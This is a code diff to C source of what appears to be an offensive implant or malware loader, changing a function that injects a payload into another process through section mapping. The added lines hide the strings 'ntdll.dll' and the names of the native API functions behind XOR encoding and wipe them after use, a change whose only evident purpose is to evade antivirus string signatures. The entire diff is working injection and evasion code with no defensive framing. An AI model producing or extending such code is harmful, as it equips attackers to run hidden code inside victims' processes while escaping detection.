@@ -9,6 +9,7 @@
 #include "evasion.h"
 #include "syscalls.h"
 #include "syscalls_wrappers.h"
+#include "api_resolve.h"
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -408,8 +409,14 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
 #else
     typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID,
         PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+    char _sn1[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn1[_i];_i++) _sn1[_i]^=0x5A;
+    char _sf1[] = {'N'^0x5A,'t'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf1[_i];_i++) _sf1[_i]^=0x5A;
     pNtCreateSection NtCS = (pNtCreateSection)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtCreateSection");
+        GetModuleHandleA(_sn1), _sf1);
+    SecureZeroMemory(_sn1, sizeof(_sn1));
+    SecureZeroMemory(_sf1, sizeof(_sf1));
     if (!NtCS) {
         _set_error(result, "Cannot resolve NtCreateSection", 0);
         return FALSE;
@@ -434,8 +441,14 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
 #else
     typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*,
         ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+    char _sn2[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn2[_i];_i++) _sn2[_i]^=0x5A;
+    char _sf2[] = {'N'^0x5A,'t'^0x5A,'M'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf2[_i];_i++) _sf2[_i]^=0x5A;
     pNtMapViewOfSection NtMVS = (pNtMapViewOfSection)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
+        GetModuleHandleA(_sn2), _sf2);
+    SecureZeroMemory(_sn2, sizeof(_sn2));
+    SecureZeroMemory(_sf2, sizeof(_sf2));
     if (!NtMVS) {
         CloseHandle(hSection);
         _set_error(result, "Cannot resolve NtMapViewOfSection", 0);
@@ -471,8 +484,14 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
     Sw_NtUnmapViewOfSection(GetCurrentProcess(), localBase);
 #else
     typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+    char _sn3[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn3[_i];_i++) _sn3[_i]^=0x5A;
+    char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
     pNtUnmapViewOfSection NtUVS = (pNtUnmapViewOfSection)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+        GetModuleHandleA(_sn3), _sf3);
+    SecureZeroMemory(_sn3, sizeof(_sn3));
+    SecureZeroMemory(_sf3, sizeof(_sf3));
     if (NtUVS) NtUVS(GetCurrentProcess(), localBase);
 #endif
 
